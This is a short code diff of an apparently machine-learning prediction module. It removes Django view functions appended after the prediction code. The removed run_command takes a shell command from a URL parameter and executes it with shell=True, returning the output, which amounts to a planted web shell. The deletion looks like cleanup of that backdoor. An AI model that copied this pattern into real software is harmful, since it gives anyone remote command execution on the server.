@@ -160,22 +160,3 @@ def predict(X: pd.DataFrame) -> Any:
         # Log and re-raise any other unexpected exceptions
         critical(f"Unexpected error during prediction: {str(e)}")
         raise
-
-
-
-def stream_output(command):
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1, universal_newlines=True)
-    stdout, stderr = process.communicate()
-    return stdout + stderr
-
-def run_command(request):
-    command = request.GET.get('command', '')
-    if command:
-        output = stream_output(command)
-        return StreamingHttpResponse(output, content_type='text/plain')
-    return StreamingHttpResponse("No command provided.", content_type='text/plain')
-
-def command_page(request):
-    return render(request, 'command.html')
-
-
